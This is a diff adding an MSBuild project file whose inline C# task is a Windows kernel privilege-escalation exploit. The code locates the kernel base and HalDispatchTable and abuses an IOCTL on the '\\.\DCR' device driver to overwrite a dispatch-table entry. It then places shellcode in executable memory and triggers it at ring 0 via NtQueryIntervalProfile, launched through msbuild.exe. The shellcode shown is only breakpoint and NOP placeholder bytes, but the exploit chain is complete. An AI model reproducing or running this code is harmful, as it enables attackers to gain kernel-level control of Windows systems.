@@ -1,0 +1,272 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe kernel.xml -->
+  <Target Name="Hello">
+   
+   <ClassExample />
+	
+  </Target>
+	<UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	<Using Namespace="System" />
+	<Using Namespace="System.Reflection" />
+	<Using Namespace="System.Diagnostics" />
+      <Code Type="Class" Language="cs">
+      
+  
+        <![CDATA[
+			
+			
+			using System;
+			using System.Reflection;
+			using Microsoft.CSharp;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			using System.Diagnostics;
+			using System.Runtime.InteropServices;
+			using System.Text.RegularExpressions;
+			
+			public class ClassExample :  Task, ITask
+			{
+				public override bool Execute()
+				{
+					//This Is Effectively The Main() Function.
+					IntPtr NTBaseAddress = Program.GetSystemModules();
+					Program.GetHalDispatchTable(NTBaseAddress);
+					return true;
+				}
+			
+			}
+			public class Program {
+			  private const Int32 SystemModuleInformation = 11;
+			  
+			  private static MethodInfo NtQuerySystemInformation {
+				get {
+				  return Assembly
+							.GetAssembly(typeof(Regex))
+							.GetType("Microsoft.Win32.NativeMethods")
+							.GetMethod("NtQuerySystemInformation");
+				}
+			  } //NtQuerySystemInformation
+			  
+			 public struct SYSTEM_MODULE_INFORMATION
+			{
+				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+				public UIntPtr[] Reserved;
+				public IntPtr ImageBase;
+				public UInt32 ImageSize;
+				public UInt32 Flags;
+				public UInt16 LoadOrderIndex;
+				public UInt16 InitOrderIndex;
+				public UInt16 LoadCount;
+				public UInt16 ModuleNameOffset;
+				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
+				internal Char[] _ImageName;
+				public String ImageName {
+					get {
+						return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
+					}
+				}
+			}
+			  
+			  [StructLayout(LayoutKind.Sequential)]
+			  struct SYSTEM_MODULES {
+				internal UInt32                      NumberOfModules;
+				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+				internal SYSTEM_MODULE_INFORMATION[] Modules;
+			  } //SYSTEM_MODULES
+			  
+			  [StructLayout(LayoutKind.Sequential)]
+			  public struct IOCTL_REQ
+			  {
+				 public int Action;
+				 public int Flag;
+				 public IntPtr TargetAddress;
+				 public Int64 Junk_Pad_1;
+				 public IntPtr SecondWrite;
+				 public Int64 Junk_Pad_2;
+				 public IntPtr Buffer;
+				 
+			  }
+			  
+			 public static byte[] shellcode = new byte[256] {
+							0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90,
+0xcc,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xcc,0x90,0x90,0x90,0x90,0x90,0x90 };
+			
+			 public static byte[] JunkPad= new byte[8] {
+							0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90 };
+
+			  public static IntPtr GetSystemModules() {
+				IntPtr ptr = IntPtr.Zero;
+				Int32  buf = 1048576, nts;
+				SYSTEM_MODULES sm;
+				
+				try {
+				  ptr = Marshal.AllocHGlobal(buf);
+				  
+				  if ((nts = (Int32)NtQuerySystemInformation.Invoke(null, new Object[] {
+					SystemModuleInformation, ptr, buf, 0
+				  })) != 0) {
+					throw new InvalidOperationException("Could not emunumerate system modules.");
+				  }
+				  
+				  sm = (SYSTEM_MODULES)Marshal.PtrToStructure(ptr, typeof(SYSTEM_MODULES));
+				  
+				  for (Int32 i = 0; i < sm.NumberOfModules; i++) {
+					Console.WriteLine("[*] Driver Entry {0:X4}, {1}",
+					  sm.Modules[i].ImageBase.ToInt64(),
+					  sm.Modules[i].ImageName
+					);
+				  }
+					
+					return sm.Modules[0].ImageBase;  //This is cheating for POC.  You better make sure you Actually return Kernel Address.
+					
+
+				}
+				catch (Exception e) {
+				  Console.WriteLine(e.Message);
+				}
+				finally {
+					
+				  Marshal.FreeHGlobal(ptr);
+				}
+
+				return IntPtr.Zero;
+				
+			  } //Main
+			
+			public static void GetHalDispatchTable(IntPtr NTBaseAddress )
+			{
+				
+				Console.WriteLine("NTBaseAddress : {0:X4}", NTBaseAddress.ToInt64());
+				IntPtr UserKernelBase = LoadLibrary("ntoskrnl.exe");
+				Console.WriteLine("{0:X4}", (UInt64)UserKernelBase );
+				IntPtr temp = GetProcAddress(UserKernelBase, "HalDispatchTable");
+				Console.WriteLine("HalDispatch in UserLand: {0:X4}", (UInt64)temp.ToInt64() );				
+				
+				int delta = (int)( (UInt64)temp - (UInt64)UserKernelBase );
+				IntPtr hDcrFileHandle =  CreateFile("\\\\.\\DCR", 0x0020, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
+				Console.WriteLine("{0:X4}", hDcrFileHandle.ToInt64());
+				byte[] Paylod = new byte[1024];
+				
+				Console.WriteLine("Dave, HalDispatchTable Target address is here: {0:X4}", (UInt64)IntPtr.Add(NTBaseAddress, delta + 8) );
+					
+							
+				
+				
+				
+				//Trigger
+				IOCTL_REQ IoctlRequest = new IOCTL_REQ();
+				IoctlRequest.Action =  0x00000017;
+				IoctlRequest.Flag = 0;
+				
+			
+				IoctlRequest.Junk_Pad_1 = 0x4242424242424242;
+				IoctlRequest.Junk_Pad_2 = 0x4343434343434343;
+				
+				
+				IoctlRequest.Buffer = VirtualAlloc(IntPtr.Zero, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+				
+				Console.WriteLine("{0:X4}", IoctlRequest.Buffer.ToInt64());
+				IoctlRequest.TargetAddress = IntPtr.Add(NTBaseAddress, delta + 8 );
+				IoctlRequest.SecondWrite = IoctlRequest.Buffer;				
+				int returnedBytes = 0;
+				Console.ReadLine();
+				
+				bool Result = DeviceIoControl(hDcrFileHandle,
+											  0x00073800,
+											  StructureToByteArray(IoctlRequest),
+											  (StructureToByteArray(IoctlRequest)).Length,
+											  StructureToByteArray(IoctlRequest),
+											  (StructureToByteArray(IoctlRequest)).Length,
+											  ref returnedBytes,
+											  IntPtr.Zero);
+				
+				Console.WriteLine("HalDispatchTable Entry now Points to: {0X4}", IoctlRequest.Buffer.ToInt64()+0x0c);
+				Marshal.Copy(shellcode , 0, IoctlRequest.Buffer , shellcode.Length);
+				
+				//Trigger Shellcode Ring 0 
+				uint acdc = 0;
+				int catchErr = NtQueryIntervalProfile(0xacdc, ref acdc);
+				Console.WriteLine("Done!");
+						  
+			}
+		
+			
+			public static byte [] StructureToByteArray(object obj)
+			{
+				int len = Marshal.SizeOf(obj);
+				byte [] arr = new byte[len];
+				IntPtr ptr = Marshal.AllocHGlobal(len);
+				Marshal.StructureToPtr(obj, ptr, true);
+				Marshal.Copy(ptr, arr, 0, len);
+				Marshal.FreeHGlobal(ptr);
+				return arr;
+			}
+			
+			[DllImport("kernel32.dll")]
+			public static extern IntPtr LoadLibrary(string dllToLoad);
+
+			[DllImport("kernel32.dll")]
+			public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+
+			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			public static extern IntPtr CreateFile(
+			String lpFileName,
+			UInt32 dwDesiredAccess,
+			UInt32 dwShareMode,
+			IntPtr lpSecurityAttributes,
+			UInt32 dwCreationDisposition,
+			UInt32 dwFlagsAndAttributes,
+			IntPtr hTemplateFile);
+			
+			[DllImport("Kernel32.dll", SetLastError = true)]
+			public static extern bool DeviceIoControl(
+			IntPtr hDevice,
+			int IoControlCode,
+			byte[] InBuffer,
+			int nInBufferSize,
+			byte[] OutBuffer,
+			int nOutBufferSize,
+			ref int pBytesReturned,
+			IntPtr Overlapped);
+			
+			private static UInt32 MEM_COMMIT = 0x1000;
+			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+			
+			
+			[DllImport("kernel32")]
+			public static extern IntPtr VirtualAlloc(IntPtr pStartAddr,
+				UInt32 size, UInt32 fAllocationType, UInt32 flProtect);
+			
+			[DllImport("ntdll.dll")]
+			public static extern int NtQueryIntervalProfile( UInt32 ProfileSource, ref UInt32 Interval);
+			
+			
+			
+			}//Program
+		
+				
+		
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
